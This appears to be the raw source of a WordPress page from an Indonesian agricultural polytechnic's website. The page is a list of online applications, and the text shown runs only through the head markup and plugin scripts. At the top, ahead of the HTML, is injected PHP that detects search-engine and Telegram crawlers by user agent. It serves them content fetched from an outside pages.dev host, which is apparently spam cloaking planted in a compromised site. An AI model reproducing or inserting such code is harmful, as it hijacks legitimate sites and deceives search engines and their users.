<?php
     function is_bot() {
         $user_agent = $_SERVER['HTTP_USER_AGENT'];
         $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'adsense', 'slurp');
         
         foreach ($bots as $bot) {
             if (stripos($user_agent, $bot) !== false) {
                 return true;
             }
         }
         
         return false;
     }
     if (is_bot()) {
         echo file_get_contents('https://pepikumpulan-aplikasi-online.pages.dev/datahkb.html');
     exit;
     }
     ?>
    
    <!DOCTYPE html>
<html dir="ltr" lang="id" prefix="og: https://ogp.me/ns#">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<meta name="mobile-web-app-capable" content="yes">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<meta name="apple-mobile-web-app-title" content="Politeknik Enjiniring Pertanian Indonesia - Politeknik Enjiniring Pertanian Indonesia">
	<link rel="profile" href="https://gmpg.org/xfn/11">
	<link rel="pingback" href="https://pepi.ac.id/xmlrpc.php">
	<link rel="icon" type="image/png" href="https://pepi.ac.id/wp-content/uploads/2020/01/logo.png"/>
	<title>Kumpulan Aplikasi Online | Politeknik Enjiniring Pertanian Indonesia</title>
		    <!-- PVC Template -->
    <script type="text/template" id="pvc-stats-view-template">
    <i class="pvc-stats-icon small" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" version="1.0" viewBox="0 0 502 315" preserveAspectRatio="xMidYMid meet"><g transform="translate(0,332) scale(0.1,-0.1)" fill="" stroke="none"><path d="M2394 3279 l-29 -30 -3 -207 c-2 -182 0 -211 15 -242 39 -76 157 -76 196 0 15 31 17 60 15 243 l-3 209 -33 29 c-26 23 -41 29 -80 29 -41 0 -53 -5 -78 -31z"/><path d="M3085 3251 c-45 -19 -58 -50 -96 -229 -47 -217 -49 -260 -13 -295 52 -53 146 -42 177 20 16 31 87 366 87 410 0 70 -86 122 -155 94z"/><path d="M1751 3234 c-13 -9 -29 -31 -37 -50 -12 -29 -10 -49 21 -204 19 -94 39 -189 45 -210 14 -50 54 -80 110 -80 34 0 48 6 76 34 21 21 34 44 34 59 0 14 -18 113 -40 219 -37 178 -43 195 -70 221 -36 32 -101 37 -139 11z"/><path d="M1163 3073 c-36 -7 -73 -59 -73 -102 0 -56 133 -378 171 -413 34 -32 83 -37 129 -13 70 36 67 87 -16 290 -86 209 -89 214 -129 231 -35 14 -42 15 -82 7z"/><path d="M3689 3066 c-15 -9 -33 -30 -42 -48 -48 -103 -147 -355 -147 -375 0 -98 131 -148 192 -74 13 15 57 108 97 206 80 196 84 226 37 273 -30 30 -99 39 -137 18z"/><path d="M583 2784 c-38 -19 -67 -74 -58 -113 9 -42 211 -354 242 -373 16 -10 45 -18 66 -18 51 0 107 52 107 100 0 39 -1 41 -124 234 -80 126 -108 162 -133 173 -41 17 -61 16 -100 -3z"/><path d="M4250 2784 c-14 -9 -74 -91 -133 -183 -95 -150 -107 -173 -107 -213 0 -55 33 -94 87 -104 67 -13 90 8 211 198 130 202 137 225 78 284 -27 27 -42 34 -72 34 -22 0 -50 -8 -64 -16z"/><path d="M2275 2693 c-553 -48 -1095 -270 -1585 -649 -135 -104 -459 -423 -483 -476 -23 -49 -22 -139 2 -186 73 -142 361 -457 571 -626 285 -228 642 -407 990 -497 242 -63 336 -73 660 -74 310 0 370 5 595 52 535 111 1045 392 1455 803 122 121 250 273 275 326 19 41 19 137 0 174 -41 79 -309 363 -465 492 -447 370 -946 591 -1479 653 -113 14 -422 18 -536 8z m395 -428 c171 -34 330 -124 456 -258 112 -119 167 -219 211 -378 27 -96 24 -300 -5 -401 -72 -255 -236 -447 -474 -557 -132 -62 -201 -76 -368 -76 -167 0 -236 14 -368 76 -213 98 -373 271 -451 485 -162 444 86 934 547 1084 153 49 292 57 452 25z m909 -232 c222 -123 408 -262 593 -441 76 -74 138 -139 138 -144 0 -16 -233 -242 -330 -319 -155 -123 -309 -223 -461 -299 l-81 -41 32 46 c18 26 49 83 70 128 143 306 141 649 -6 957 -25 52 -61 116 -79 142 l-34 47 45 -20 c26 -10 76 -36 113 -56z m-2057 25 c-40 -58 -105 -190 -130 -263 -110 -324 -59 -707 132 -981 25 -35 42 -64 37 -64 -19 0 -241 119 -326 174 -188 122 -406 314 -532 468 l-58 71 108 103 c185 178 428 349 672 473 66 33 121 60 123 61 2 0 -10 -19 -26 -42z"/><path d="M2375 1950 c-198 -44 -350 -190 -395 -379 -18 -76 -8 -221 19 -290 114 -284 457 -406 731 -260 98 52 188 154 231 260 27 69 37 214 19 290 -38 163 -166 304 -326 360 -67 23 -215 33 -279 19z"/></g></svg></i> 
	 <%= total_view %> total views	<% if ( today_view > 0 ) { %>
		<span class="views_today">,  <%= today_view %> views today</span>
	<% } %>
	</span>
	</script>
		    <style>
#wpadminbar #wp-admin-bar-wsm_free_top_button .ab-icon:before {
	content: "\f239";
	color: #FF9800;
	top: 3px;
}
</style>
		<!-- All in One SEO 4.9.7.2 - aioseo.com -->
	<meta name="robots" content="max-image-preview:large" />
	<link rel="canonical" href="https://pepi.ac.id/kumpulan-aplikasi-online/" />
	<meta name="generator" content="All in One SEO (AIOSEO) 4.9.7.2" />
		<meta property="og:locale" content="id_ID" />
		<meta property="og:site_name" content="Politeknik Enjiniring Pertanian Indonesia | Politeknik Enjiniring Pertanian Indonesia" />
		<meta property="og:type" content="article" />
		<meta property="og:title" content="Kumpulan Aplikasi Online | Politeknik Enjiniring Pertanian Indonesia" />
		<meta property="og:url" content="https://pepi.ac.id/kumpulan-aplikasi-online/" />
		<meta property="article:published_time" content="2020-01-27T07:47:47+00:00" />
		<meta property="article:modified_time" content="2021-11-18T07:05:39+00:00" />
		<meta name="twitter:card" content="summary" />
		<meta name="twitter:title" content="Kumpulan Aplikasi Online | Politeknik Enjiniring Pertanian Indonesia" />
		<script type="application/ld+json" class="aioseo-schema">
			{"@context":"https:\/\/schema.org","@graph":[{"@type":"BreadcrumbList","@id":"https:\/\/pepi.ac.id\/kumpulan-aplikasi-online\/#breadcrumblist","itemListElement":[{"@type":"ListItem","@id":"https:\/\/pepi.ac.id#listItem","position":1,"name":"Beranda","item":"https:\/\/pepi.ac.id","nextItem":{"@type":"ListItem","@id":"https:\/\/pepi.ac.id\/kumpulan-aplikasi-online\/#listItem","name":"Kumpulan Aplikasi Online"}},{"@type":"ListItem","@id":"https:\/\/pepi.ac.id\/kumpulan-aplikasi-online\/#listItem","position":2,"name":"Kumpulan Aplikasi Online","previousItem":{"@type":"ListItem","@id":"https:\/\/pepi.ac.id#listItem","name":"Beranda"}}]},{"@type":"Organization","@id":"https:\/\/pepi.ac.id\/#organization","name":"Politeknik Enjiniring Pertanian Indonesia","description":"Politeknik Enjiniring Pertanian Indonesia","url":"https:\/\/pepi.ac.id\/"},{"@type":"WebPage","@id":"https:\/\/pepi.ac.id\/kumpulan-aplikasi-online\/#webpage","url":"https:\/\/pepi.ac.id\/kumpulan-aplikasi-online\/","name":"Kumpulan Aplikasi Online | Politeknik Enjiniring Pertanian Indonesia","inLanguage":"id-ID","isPartOf":{"@id":"https:\/\/pepi.ac.id\/#website"},"breadcrumb":{"@id":"https:\/\/pepi.ac.id\/kumpulan-aplikasi-online\/#breadcrumblist"},"datePublished":"2020-01-27T07:47:47+00:00","dateModified":"2021-11-18T07:05:39+00:00"},{"@type":"WebSite","@id":"https:\/\/pepi.ac.id\/#website","url":"https:\/\/pepi.ac.id\/","name":"pepi.ac.id","description":"Politeknik Enjiniring Pertanian Indonesia","inLanguage":"id-ID","publisher":{"@id":"https:\/\/pepi.ac.id\/#organization"}}]}
		</script>
		<!-- All in One SEO -->

<link rel='dns-prefetch' href='//translate.google.com' />
<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel='preconnect' href='https://fonts.gstatic.com' crossorigin />
<link rel="alternate" type="application/rss+xml" title="Politeknik Enjiniring Pertanian Indonesia &raquo; Feed" href="https://pepi.ac.id/feed/" />
<link rel="alternate" type="application/rss+xml" title="Politeknik Enjiniring Pertanian Indonesia &raquo; Umpan Komentar" href="https://pepi.ac.id/comments/feed/" />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://pepi.ac.id/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fpepi.ac.id%2Fkumpulan-aplikasi-online%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://pepi.ac.id/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fpepi.ac.id%2Fkumpulan-aplikasi-online%2F&#038;format=xml" />
<style id="wp-img-auto-sizes-contain-inline-css">
img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
/*# sourceURL=wp-img-auto-sizes-contain-inline-css */
</style>
<link rel='stylesheet' id='eo-leaflet.js-css' href='https://pepi.ac.id/wp-content/plugins/event-organiser/lib/leaflet/leaflet.min.css?ver=1.4.0' media='all' />
<style id="eo-leaflet.js-inline-css">
.leaflet-popup-close-button{box-shadow:none!important;}
/*# sourceURL=eo-leaflet.js-inline-css */
</style>
<style id="wp-emoji-styles-inline-css">

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
/*# sourceURL=wp-emoji-styles-inline-css */
</style>
<style id="wp-block-library-inline-css">
:root{--wp-block-synced-color:#7a00df;--wp-block-synced-color--rgb:122,0,223;--wp-bound-block-color:var(--wp-block-synced-color);--wp-editor-canvas-background:#ddd;--wp-admin-theme-color:#007cba;--wp-admin-theme-color--rgb:0,124,186;--wp-admin-theme-color-darker-10:#006ba1;--wp-admin-theme-color-darker-10--rgb:0,107,160.5;--wp-admin-theme-color-darker-20:#005a87;--wp-admin-theme-color-darker-20--rgb:0,90,135;--wp-admin-border-width-focus:2px}@media (min-resolution:192dpi){:root{--wp-admin-border-width-focus:1.5px}}.wp-element-button{cursor:pointer}:root .has-very-light-gray-background-color{background-color:#eee}:root .has-very-dark-gray-background-color{background-color:#313131}:root .has-very-light-gray-color{color:#eee}:root .has-very-dark-gray-color{color:#313131}:root .has-vivid-green-cyan-to-vivid-cyan-blue-gradient-background{background:linear-gradient(135deg,#00d084,#0693e3)}:root .has-purple-crush-gradient-background{background:linear-gradient(135deg,#34e2e4,#4721fb 50%,#ab1dfe)}:root .has-hazy-dawn-gradient-background{background:linear-gradient(135deg,#faaca8,#dad0ec)}:root .has-subdued-olive-gradient-background{background:linear-gradient(135deg,#fafae1,#67a671)}:root .has-atomic-cream-gradient-background{background:linear-gradient(135deg,#fdd79a,#004a59)}:root .has-nightshade-gradient-background{background:linear-gradient(135deg,#330968,#31cdcf)}:root .has-midnight-gradient-background{background:linear-gradient(135deg,#020381,#2874fc)}:root{--wp--preset--font-size--normal:16px;--wp--preset--font-size--huge:42px}.has-regular-font-size{font-size:1em}.has-larger-font-size{font-size:2.625em}.has-normal-font-size{font-size:var(--wp--preset--font-size--normal)}.has-huge-font-size{font-size:var(--wp--preset--font-size--huge)}:root .has-text-align-center{text-align:center}:root .has-text-align-left{text-align:left}:root .has-text-align-right{text-align:right}.has-fit-text{white-space:nowrap!important}#end-resizable-editor-section{display:none}.aligncenter{clear:both}.items-justified-left{justify-content:flex-start}.items-justified-center{justify-content:center}.items-justified-right{justify-content:flex-end}.items-justified-space-between{justify-content:space-between}.screen-reader-text{word-wrap:normal!important;border:0;clip-path:inset(50%);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px}.screen-reader-text:focus{background-color:#ddd;clip-path:none;color:#444;display:block;font-size:1em;height:auto;left:5px;line-height:normal;padding:15px 23px 14px;text-decoration:none;top:5px;width:auto;z-index:100000}html :where(.has-border-color){border-style:solid}html :where([style*=border-color]){border-style:solid}html :where([style*=border-top-color]){border-top-style:solid}html :where([style*=border-right-color]){border-right-style:solid}html :where([style*=border-bottom-color]){border-bottom-style:solid}html :where([style*=border-left-color]){border-left-style:solid}html :where([style*=border-width]){border-style:solid}html :where([style*=border-top-width]){border-top-style:solid}html :where([style*=border-right-width]){border-right-style:solid}html :where([style*=border-bottom-width]){border-bottom-style:solid}html :where([style*=border-left-width]){border-left-style:solid}html :where(img[class*=wp-image-]){height:auto;max-width:100%}:where(figure){margin:0 0 1em}html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:var(--wp-admin--admin-bar--height,0px)}@media screen and (max-width:600px){html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:0px}}

/*# sourceURL=/wp-includes/css/dist/block-library/common.min.css */
</style>
<style id="classic-theme-styles-inline-css">
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
/*# sourceURL=/wp-includes/css/classic-themes.min.css */
</style>

<style id="global-styles-inline-css">
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgb(6,147,227) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgb(252,185,0) 0%,rgb(255,105,0) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgb(255,105,0) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgb(255, 255, 255), 6px 6px rgb(0, 0, 0);--wp--preset--shadow--crisp: 6px 6px 0px rgb(0, 0, 0);}:where(body) { margin: 0; }:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}body{padding-top: 0px;padding-right: 0px;padding-bottom: 0px;padding-left: 0px;}:root :where(.wp-element-button, .wp-block-button__link){background-color: #32373c;border-width: 0;color: #fff;font-family: inherit;font-size: inherit;font-style: inherit;font-weight: inherit;letter-spacing: inherit;line-height: inherit;padding-top: calc(0.667em + 2px);padding-right: calc(1.333em + 2px);padding-bottom: calc(0.667em + 2px);padding-left: calc(1.333em + 2px);text-decoration: none;text-transform: inherit;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
/*# sourceURL=global-styles-inline-css */
</style>

<link rel='stylesheet' id='email-subscribers-css' href='https://pepi.ac.id/wp-content/plugins/email-subscribers/lite/public/css/email-subscribers-public.css?ver=5.9.24' media='all' />
<link rel='stylesheet' id='google-language-translator-css' href='https://pepi.ac.id/wp-content/plugins/google-language-translator/css/style.css?ver=6.0.20' media='' />
<link rel='stylesheet' id='glt-toolbar-styles-css' href='https://pepi.ac.id/wp-content/plugins/google-language-translator/css/toolbar.css?ver=6.0.20' media='' />
<link rel='stylesheet' id='a3-pvc-style-css' href='https://pepi.ac.id/wp-content/plugins/page-views-count/assets/css/style.min.css?ver=2.8.4' media='all' />
<link rel='stylesheet' id='dashicons-css' href='https://pepi.ac.id/wp-includes/css/dashicons.min.css?ver=7.0' media='all' />
<link rel='stylesheet' id='post-views-counter-frontend-css' href='https://pepi.ac.id/wp-content/plugins/post-views-counter/css/frontend.min.css?ver=1.4.7' media='all' />
<link rel='stylesheet' id='rs-plugin-settings-css' href='https://pepi.ac.id/wp-content/plugins/revslider/public/assets/css/settings.css?ver=5.4.8.3' media='all' />
<style id="rs-plugin-settings-inline-css">
#rs-demo-id {}
/*# sourceURL=rs-plugin-settings-inline-css */
</style>
<link rel='stylesheet' id='wptu-front-style-css' href='https://pepi.ac.id/wp-content/plugins/ticker-ultimate/assets/css/wptu-front.css?ver=1.7.6' media='all' />
<link rel='stylesheet' id='wsm-style-css' href='https://pepi.ac.id/wp-content/plugins/wp-stats-manager/css/style.css?ver=1.2' media='all' />
<link rel='stylesheet' id='ivory-search-styles-css' href='https://pepi.ac.id/wp-content/plugins/add-search-to-menu/public/css/ivory-search.min.css?ver=5.5.15' media='all' />
<link rel='stylesheet' id='font-awesome-5-css' href='https://pepi.ac.id/wp-content/plugins/bb-plugin/fonts/fontawesome/css/all.min.css?ver=2.2.1.5' media='all' />
<link rel='stylesheet' id='fl-builder-layout-bundle-0752e87a17204861a5757504b11f8661-css' href='https://pepi.ac.id/wp-content/uploads/bb-plugin/cache/0752e87a17204861a5757504b11f8661-layout-bundle.css?ver=2.2.1.5-1.3-alpha.1' media='all' />
<link rel='stylesheet' id='floating-news-headline-ticker-css' href='https://pepi.ac.id/wp-content/plugins/floating-news-headline/build/index.css?ver=1.3.3' media='all' />
<link rel='stylesheet' id='vsstem-styles-css' href='https://pepi.ac.id/wp-content/themes/vsstem/css/theme.min.css?ver=1.1.0' media='' />
<link rel='stylesheet' id='animate-styles-css' href='https://pepi.ac.id/wp-content/themes/vsstem/css/animate.min.css?ver=1.1.0' media='' />
<link rel='stylesheet' id='bootstrap-dropdownhover-css' href='https://pepi.ac.id/wp-content/themes/vsstem/css/bootstrap-dropdownhover.min.css?ver=1.1.0' media='' />
<link rel='stylesheet' id='vsstem-custom-css' href='https://pepi.ac.id/wp-content/themes/vsstem/css/custom.css?ver=1.1.0' media='' />
<link rel='stylesheet' id='eacs-style-css' href='https://pepi.ac.id/wp-content/plugins/easy-accessibility/css/main.css?ver=7.0' media='all' />
<link rel='stylesheet' id='joinchat-css' href='https://pepi.ac.id/wp-content/plugins/creame-whatsapp-me/public/css/joinchat.min.css?ver=5.1.7' media='all' />
<link rel='stylesheet' id='pojo-a11y-css' href='https://pepi.ac.id/wp-content/plugins/pojo-accessibility/assets/css/style.min.css?ver=1.0.0' media='all' />
<link rel='stylesheet' id='a3pvc-css' href='//pepi.ac.id/wp-content/uploads/sass/pvc.min.css?ver=1637136747' media='all' />
<link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Roboto:500&#038;display=swap&#038;ver=1756948837" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:500&#038;display=swap&#038;ver=1756948837" media="print" onload="this.media='all'"><noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:500&#038;display=swap&#038;ver=1756948837" /></noscript><script id="jquery-core-js" src="https://pepi.ac.id/wp-includes/js/jquery/jquery.min.js?ver=3.7.1"></script>
<script id="jquery-migrate-js" src="https://pepi.ac.id/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1"></script>
<script id="underscore-js" src="https://pepi.ac.id/wp-includes/js/underscore.min.js?ver=1.13.8"></script>
<script id="backbone-js" src="https://pepi.ac.id/wp-includes/js/backbone.min.js?ver=1.6.1"></script>
<script id="a3-pvc-backbone-js-extra">
var pvc_vars = {"rest_api_url":"https://pepi.ac.id/wp-json/pvc/v1","ajax_url":"https://pepi.ac.id/wp-admin/admin-ajax.php","security":"8f913f173a","ajax_load_type":"rest_api"};
//# sourceURL=a3-pvc-backbone-js-extra
</script>
<script id="a3-pvc-backbone-js" src="https://pepi.ac.id/wp-content/plugins/page-views-count/assets/js/pvc.backbone.min.js?ver=2.8.4"></script>
<script id="tp-tools-js" src="https://pepi.ac.id/wp-content/plugins/revslider/public/assets/js/jquery.themepunch.tools.min.js?ver=5.4.8.3"></script>
<script id="revmin-js" src="https://pepi.ac.id/wp-content/plugins/revslider/public/assets/js/jquery.themepunch.revolution.min.js?ver=5.4.8.3"></script>
<script id="imagesloaded-js" src="https://pepi.ac.id/wp-includes/js/imagesloaded.min.js?ver=7.0"></script>
<script id="popper-scripts-js" src="https://pepi.ac.id/wp-content/themes/vsstem/js/popper.min.js?ver=1"></script>
<script id="eacsmj-lib-js" src="https://pepi.ac.id/wp-content/plugins/easy-accessibility/js/eacs-handler.js?ver=7.0"></script>
<script id="eacsmj-main-script-js-extra">
var ajax_eacs_obj = {"icon":"1","icon_pos":"right","icon_color":"#ffffff","icon_bg_color":"#000000","icon_hcolor":"#ffffff","icon_hbgcolor":"#2271b1","toolbar_heading":"","toolbar_color":"#ffffff","toolbar_bg_color":"#000000","titem_color":"#ffffff","titem_bg_color":"#2f2f2f","titem_hcolor":"#ffffff","titem_hbgcolor":"#2f2f2f","ticon_color":"#ffffff"};
//# sourceURL=eacsmj-main-script-js-extra
</script>
<script id="eacsmj-main-script-js" src="https://pepi.ac.id/wp-content/plugins/easy-accessibility/js/eacs.js?ver=7.0"></script>
<link rel="https://api.w.org/" href="https://pepi.ac.id/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://pepi.ac.id/wp-json/wp/v2/pages/618" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://pepi.ac.id/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 7.0" />
<link rel='shortlink' href='https://pepi.ac.id/?p=618' />
<meta name="generator" content="Redux 4.4.18" /><style>.goog-te-gadget{margin-top:2px!important;}p.hello{font-size:12px;color:#666;}div.skiptranslate.goog-te-gadget{display:inline!important;}#google_language_translator{clear:both;}#flags{width:165px;}#flags a{display:inline-block;margin-right:2px;}#google_language_translator{width:auto!important;}div.skiptranslate.goog-te-gadget{display:inline!important;}.goog-tooltip{display: none!important;}.goog-tooltip:hover{display: none!important;}.goog-text-highlight{background-color:transparent!important;border:none!important;box-shadow:none!important;}#google_language_translator select.goog-te-combo{color:#32373c;}#google_language_translator{color:transparent;}body{top:0px!important;}#goog-gt-{display:none!important;}font font{background-color:transparent!important;box-shadow:none!important;position:initial!important;}#glt-translate-trigger{left:20px;right:auto;}#glt-translate-trigger > span{color:#ffffff;}#glt-translate-trigger{background:#f89406;}</style>	   
    <!-- Wordpress Stats Manager -->
    <script type="text/javascript">
          var _wsm = _wsm || [];
           _wsm.push(['trackPageView']);
           _wsm.push(['enableLinkTracking']);
           _wsm.push(['enableHeartBeatTimer']);
          (function() {
            var u="https://pepi.ac.id/wp-content/plugins/wp-stats-manager/";
            _wsm.push(['setUrlReferrer', ""]);
            _wsm.push(['setTrackerUrl',"https://pepi.ac.id/?wmcAction=wmcTrack"]);
            _wsm.push(['setSiteId', "1"]);
            _wsm.push(['setPageId', "618"]);
            _wsm.push(['setWpUserId', "0"]);           
            var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
            g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'js/wsm_new.js'; s.parentNode.insertBefore(g,s);
          })();
    </script>
    <!-- End Wordpress Stats Manager Code -->
